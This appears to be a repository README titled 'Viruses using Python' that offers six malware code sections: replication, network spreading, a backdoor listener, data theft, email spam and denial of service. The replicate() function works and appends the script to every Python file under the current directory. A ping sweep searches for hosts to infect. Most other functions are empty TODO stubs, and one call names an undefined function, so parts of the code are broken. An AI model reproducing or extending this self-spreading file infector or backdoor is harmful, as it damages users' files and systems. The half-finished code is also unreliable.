# Viruses using Python

## Functionalities

***1. Basic Virus Structure***
This code demonstrates a basic virus structure, including how to replicate itself, how to hide itself from detection, and how to execute malicious code.

``` py
# Basic Virus Structure in Python
import os

def replicate():
    virus_code = open(__file__).read()
    target_files = []
    for root, dirs, files in os.walk(os.getcwd()):
        for file in files:
            if file.endswith('.py'):
                target_files.append(os.path.join(root, file))
    for file in target_files:
        with open(file, 'a') as f:
            f.write(virus_code)

def hide():
    pass # TODO: add code for hiding the virus

def execute():
    pass # TODO: add code for executing malicious code

if __name__ == '__main__':
    replicate()
    hide()
    execute()
```

***2. Network Propagation***
This code demonstrates how to propagate the virus over a network, using a worm-like technique. The virus scans the network for vulnerable machines and infects them automatically.

``` py
# Network Propagation in Python
import socket
import subprocess
import os

def scan_network():
    ip = socket.gethostbyname(socket.gethostname())
    ip_parts = ip.split('.')
    for i in range(1, 255):
        target_ip = f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}.{i}"
        if target_ip == ip:
            continue
        result = subprocess.call(['ping', '-n', '1', '-w', '500', target_ip])
        if result == 0:
            infect(target_ip)

def infect(target_ip):
    # TODO: add code for infecting the target machine
    pass

if __name__ == '__main__':
    scan_network()
```

***3. Remote Access***

This code demonstrates how to create a backdoor into a victim's computer, allowing remote access and control.

``` py
# Remote Access in Python
import socket
import subprocess
import os

def connect():
    s = socket.socket()
    s.bind(('0.0.0.0', 1234))
    s.listen(1)
    conn, addr = s.accept()
    print(f"Connection established with {addr[0]}")
    while True:
        command = input("Enter command: ")
        conn.send(command.encode())
        if command == 'exit':
            break
        output = conn.recv(1024)
        print(output.decode())

def run_command(command):
    result = subprocess.check_output(command, shell=True)
    return result

if __name__ == '__main__':
    connect()
```

***4. Data Theft***
This code demonstrates how to steal sensitive data from a victim's computer, including passwords, credit card details, and other private information.

``` py
# Data Theft in Python
import os

def steal_passwords():
    # TODO: add code for stealing passwords
    pass

def steal_credit_cards():
    # TODO: add code for stealing credit card details
    pass

def steal_private_info():
    # TODO: add code for stealing private information
    pass

if __name__ == '__main__':
    steal_password
```

***5.Email Spamming***
This code demonstrates how to send spam emails from a victim's computer, using their email account and address book.

``` py
# Email Spamming in Python
import smtplib
import email.message
import os

def spam_emails():
    # TODO: add code for spamming emails
    pass

if __name__ == '__main__':
    spam_emails()
```

***6. Denial of Service (DoS) Attack***
This code demonstrates how to launch a DoS attack on a target website, rendering it inaccessible to users.

``` py

# DoS Attack in Python
import socket
import time
import os

def launch_dos_attack():
    # TODO: add code for launching DoS attack
    pass

if __name__ == '__main__':
    launch_dos_attack()

```
